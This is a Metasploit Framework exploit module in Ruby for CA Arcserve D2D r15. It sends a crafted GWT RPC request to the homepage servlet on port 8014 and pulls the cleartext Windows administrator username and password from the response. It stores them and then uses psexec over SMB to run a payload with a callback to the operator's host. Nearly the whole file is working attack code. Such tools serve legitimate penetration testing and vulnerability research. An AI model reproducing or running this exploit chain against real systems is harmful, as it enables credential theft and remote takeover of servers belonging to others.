# $Id: ca_arcserve_rpc_authbypass.rb 13467 2011-08-01 21:20:29Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Auxiliary::Report
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;CA Arcserve D2D GWT RPC Credential Information Disclosure&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits an information disclosure vulnerability in the CA Arcserve
                D2D r15 web server. The information disclosure can be triggered by sending a
                specially crafted RPC request to the homepage servlet. This causes CA Arcserve to
                disclosure the username and password in cleartext used for authentication. This
                username and password pair are Windows credentials with Administrator access.
            },
            &#039;Author&#039;         =>
                [
                    &#039;bannedit&#039;, # metasploit module
                    &#039;rgod&#039;, # original public exploit
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 13467 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/17574/&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Privileged&#039;     => true,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1000,
                    &#039;BadChars&#039; => "\x00\x0d\x0a",
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Automatic&#039;, { } ],
                ],
            &#039;DisclosureDate&#039; => &#039;July 25 2011&#039;,
            &#039;DefaultTarget&#039; => 0))
             
 
        register_options(
            [
                Opt::RPORT(8014),
            ], self.class )
    end
 
    def exploit
        print_status("Sending request to #{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}")
 
        data  = "5|0|4|"
        data << "http://#{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}"
        data << "/contents/"
        data << "|2C6B33BED38F825C48AE73C093241510|"
        data << "com.ca.arcflash.ui.client.homepage.HomepageService"
        data << "|getLocalHost|1|2|3|4|0|"
 
        cookie = "donotshowgettingstarted=%7B%22state%22%3Atrue%7D"
 
        resp = send_request_raw({
            &#039;uri&#039;     => &#039;/contents/service/homepage&#039;,
            &#039;version&#039; => &#039;1.1&#039;,
            &#039;method&#039;  => &#039;POST&#039;,
            &#039;cookie&#039;  => cookie,
            &#039;data&#039;    => data,
            &#039;headers&#039; =>
            {
                &#039;Content-Type&#039;  => "text/x-gwt-rpc; charset=utf-8",
                &#039;Content-Length&#039; => data.length
            }
        }, 5)
 
        resp = resp.to_s.split(&#039;,&#039;)
        user = resp[resp.index("\"user\"")+1].gsub(/\"/, "")
        pass = resp[resp.index("\"password\"")+1].gsub(/\"/, "")
     
        # report the auth
        auth = {
                :host   => datastore[&#039;RHOST&#039;],
                :port   => datastore[&#039;RPORT&#039;],
                :sname  => &#039;ca.arcserver.d2d&#039;,
                :user   => user,
                :pass   => pass,
                :active => true
            }
        report_auth_info(auth)
 
        if user.nil? or pass.nil?
            print_error("Failed to collect the username and password")
            return
        end
 
        print_good("Collected credentials User: &#039;#{user}&#039; Password: &#039;#{pass}&#039;")
 
        # try psexec on the remote host
        psexec = framework.exploits.create("windows/smb/psexec")
        psexec.register_parent(self)
 
        psexec.datastore[&#039;PAYLOAD&#039;] = self.datastore[&#039;PAYLOAD&#039;]
 
        if self.datastore[&#039;LHOST&#039;] and self.datastore[&#039;LPORT&#039;]
            psexec.datastore[&#039;LHOST&#039;] = self.datastore[&#039;LHOST&#039;]
            psexec.datastore[&#039;LPORT&#039;] = self.datastore[&#039;LPORT&#039;]
        end
 
        psexec.datastore[&#039;RHOST&#039;] = self.datastore[&#039;RHOST&#039;]
 
        psexec.datastore[&#039;DisablePayloadHandler&#039;] = true
        psexec.datastore[&#039;SMBPass&#039;] = pass
        psexec.datastore[&#039;SMBUser&#039;] = user
 
        print_status("Attempting to login via windows/smb/psexec")
 
        # this is kind of nasty would be better to split psexec code out to a mixin (on the TODO List)
        begin
            psexec.exploit_simple(
                &#039;LocalInput&#039;  => self.user_input,
                &#039;LocalOutput&#039; => self.user_output,
                &#039;Payload&#039;  => psexec.datastore[&#039;PAYLOAD&#039;],
                &#039;RunAsJob&#039; => true
            )
        rescue
            print_status("Login attempt using windows/smb/psexec failed")
            print_status("Credentials have been stored and may be useful for authentication against other services.")
            return
        end
 
        handler
    end
end



